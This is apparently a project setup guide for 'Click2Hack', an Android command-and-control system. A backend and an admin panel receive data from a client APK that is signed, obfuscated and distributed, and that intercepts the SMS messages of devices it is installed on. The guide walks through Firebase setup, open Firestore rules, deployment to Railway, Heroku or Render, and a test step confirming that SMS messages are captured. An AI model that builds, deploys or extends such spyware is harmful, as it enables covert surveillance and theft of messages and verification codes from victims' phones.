# 🛠️ C2H System Setup Guide

Complete step-by-step setup guide for Click2Hack Admin System.

## 📋 Prerequisites

### Required Software
- **Android Studio** (latest version) - [Download](https://developer.android.com/studio)
- **Node.js** 16+ - [Download](https://nodejs.org/)
- **Git** - [Download](https://git-scm.com/)
- **Firebase Account** - [Create](https://console.firebase.google.com/)

### Required Knowledge
- Basic Android development
- Basic Node.js/Express
- Firebase basics
- REST API concepts

---

## 🔥 Part 1: Firebase Setup

### Step 1: Create Firebase Project

1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Click "Add Project"
3. Enter project name: `c2h-admin-system`
4. Disable Google Analytics (optional)
5. Click "Create Project"

### Step 2: Enable Firestore Database

1. In Firebase Console, go to **Build > Firestore Database**
2. Click "Create Database"
3. Select "Start in production mode"
4. Choose location (closest to your users)
5. Click "Enable"

### Step 3: Get Service Account Key

1. Go to **Project Settings** (gear icon)
2. Navigate to **Service Accounts** tab
3. Click "Generate New Private Key"
4. Download the JSON file
5. **Keep this file secure!**

### Step 4: Setup Firestore Security Rules

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Allow all reads and writes (for development only)
    // ⚠️ Update these rules for production!
    match /{document=**} {
      allow read, write: if true;
    }
  }
}
```

---

## 🖥️ Part 2: Backend Setup

### Step 1: Clone Repository

```bash
git clone https://github.com/kishan7878/C2H-Admin-System.git
cd C2H-Admin-System/backend
```

### Step 2: Install Dependencies

```bash
npm install
```

### Step 3: Configure Environment Variables

Create `.env` file:

```bash
cp .env.example .env
```

Edit `.env`:

```env
PORT=3000
ADMIN_PASSWORD=your_secure_password_here

# Firebase Configuration
FIREBASE_PROJECT_ID=c2h-admin-system
FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\nYour_Private_Key_Here\n-----END PRIVATE KEY-----\n"
FIREBASE_CLIENT_EMAIL=firebase-adminsdk-xxxxx@c2h-admin-system.iam.gserviceaccount.com
FIREBASE_DATABASE_URL=https://c2h-admin-system.firebaseio.com

# JWT Secret
JWT_SECRET=your_random_secret_key_here
```

**How to get Firebase credentials from JSON:**

```json
{
  "project_id": "c2h-admin-system",  // → FIREBASE_PROJECT_ID
  "private_key": "-----BEGIN...",     // → FIREBASE_PRIVATE_KEY
  "client_email": "firebase-admin..." // → FIREBASE_CLIENT_EMAIL
}
```

### Step 4: Test Backend Locally

```bash
npm start
```

You should see:
```
🚀 C2H Backend API running on port 3000
📡 API URL: http://localhost:3000
✅ Server ready!
```

Test health endpoint:
```bash
curl http://localhost:3000/health
```

---

## 📱 Part 3: Admin Panel APK Setup

### Step 1: Open in Android Studio

1. Open Android Studio
2. File > Open
3. Navigate to `C2H-Admin-System/admin-panel`
4. Click "OK"
5. Wait for Gradle sync

### Step 2: Update API URL

Edit `app/src/main/java/com/c2h/admin/Config.java`:

```java
// For local testing with emulator
public static final String API_BASE_URL = "http://10.0.2.2:3000/api/";

// For local testing with real device (use your computer's IP)
// public static final String API_BASE_URL = "http://192.168.1.100:3000/api/";

// For production (after deploying backend)
// public static final String API_BASE_URL = "https://your-backend-url.com/api/";
```

### Step 3: Build APK

1. Build > Build Bundle(s) / APK(s) > Build APK(s)
2. Wait for build to complete
3. Click "locate" to find APK
4. APK location: `admin-panel/app/build/outputs/apk/debug/app-debug.apk`

### Step 4: Install on Device

```bash
# Using ADB
adb install app-debug.apk

# Or transfer APK to phone and install manually
```

---

## 📲 Part 4: Client APK Setup

### Step 1: Open in Android Studio

1. Open Android Studio (new window)
2. File > Open
3. Navigate to `C2H-Admin-System/client-app`
4. Click "OK"

### Step 2: Update API URL

Edit `app/src/main/java/com/c2h/client/Config.java`:

```java
// ⚠️ IMPORTANT: Use your deployed backend URL
public static final String API_BASE_URL = "https://your-backend-url.com/api/";
```

### Step 3: Build Release APK

1. Build > Generate Signed Bundle / APK
2. Select "APK"
3. Create new keystore or use existing
4. Fill in keystore details
5. Select "release" build variant
6. Click "Finish"

### Step 4: Test Client App

1. Install on test device
2. Grant all permissions
3. Check if device appears in Admin Panel

---

## ☁️ Part 5: Deploy Backend to Production

### Option 1: Railway (Recommended)

```bash
# Install Railway CLI
npm i -g @railway/cli

# Login
railway login

# Initialize project
cd backend
railway init

# Add environment variables
railway variables set ADMIN_PASSWORD=your_password
railway variables set FIREBASE_PROJECT_ID=your_project_id
# ... add all other variables

# Deploy
railway up
```

Your backend URL: `https://your-project.railway.app`

### Option 2: Heroku

```bash
# Install Heroku CLI
# Download from: https://devcenter.heroku.com/articles/heroku-cli

# Login
heroku login

# Create app
cd backend
heroku create c2h-backend

# Set environment variables
heroku config:set ADMIN_PASSWORD=your_password
heroku config:set FIREBASE_PROJECT_ID=your_project_id
# ... add all other variables

# Deploy
git push heroku main
```

### Option 3: Render

1. Go to [Render.com](https://render.com)
2. Connect GitHub repository
3. Create new "Web Service"
4. Select `backend` directory
5. Add environment variables
6. Click "Create Web Service"

---

## ✅ Part 6: Final Configuration

### Update Admin Panel APK

After deploying backend, update `Config.java` in Admin Panel:

```java
public static final String API_BASE_URL = "https://your-deployed-backend.com/api/";
```

Rebuild and reinstall Admin Panel APK.

### Update Client APK

Update `Config.java` in Client App:

```java
public static final String API_BASE_URL = "https://your-deployed-backend.com/api/";
```

Rebuild release APK and distribute.

---

## 🧪 Testing the Complete System

### Test 1: Backend Health Check

```bash
curl https://your-backend-url.com/health
```

Expected response:
```json
{
  "status": "ok",
  "timestamp": "2025-01-15T10:30:00.000Z",
  "uptime": 123.45
}
```

### Test 2: Admin Login

1. Open Admin Panel APK
2. Enter password (from .env ADMIN_PASSWORD)
3. Should see dashboard

### Test 3: Client Registration

1. Install Client APK on test device
2. Grant all permissions
3. Check Admin Panel - device should appear in list

### Test 4: SMS Interception

1. Send SMS to client device
2. Check Admin Panel > Device Control > SMS Logs
3. SMS should appear in logs

---

## 🔒 Security Checklist

- [ ] Changed default admin password
- [ ] Updated Firebase security rules
- [ ] Using HTTPS for backend
- [ ] Environment variables secured
- [ ] APKs signed with proper keystore
- [ ] Removed debug logs from production
- [ ] Enabled ProGuard for release builds

---

## 🐛 Troubleshooting

### Backend won't start

**Error:** `Firebase initialization failed`

**Solution:** Check Firebase credentials in `.env` file

---

### Admin Panel can't connect

**Error:** `Connection error: Failed to connect`

**Solution:** 
1. Check API_BASE_URL in Config.java
2. Ensure backend is running
3. Check firewall/network settings

---

### Client device not appearing

**Possible causes:**
1. Client app doesn't have internet
2. Wrong API_BASE_URL in client Config.java
3. Permissions not granted
4. Backend not receiving requests

**Debug:**
```bash
# Check backend logs
railway logs  # or heroku logs --tail

# Check device logcat
adb logcat | grep C2H
```

---

### SMS not being intercepted

**Solution:**
1. Ensure READ_SMS and RECEIVE_SMS permissions granted
2. Check if SMS receiver is registered in AndroidManifest.xml
3. Test with real SMS (not emulator)

---

## 📞 Support

If you encounter issues:

1. Check [Troubleshooting Guide](TROUBLESHOOTING.md)
2. Review [API Documentation](API.md)
3. Open issue on GitHub
4. Email: decentkishan78@gmail.com

---

## 🎉 Next Steps

After successful setup:

1. Customize UI/branding
2. Add more features
3. Implement encryption
4. Add Telegram notifications
5. Setup monitoring/analytics

---

**Setup complete! 🚀**

Your C2H Admin System is now ready to use.
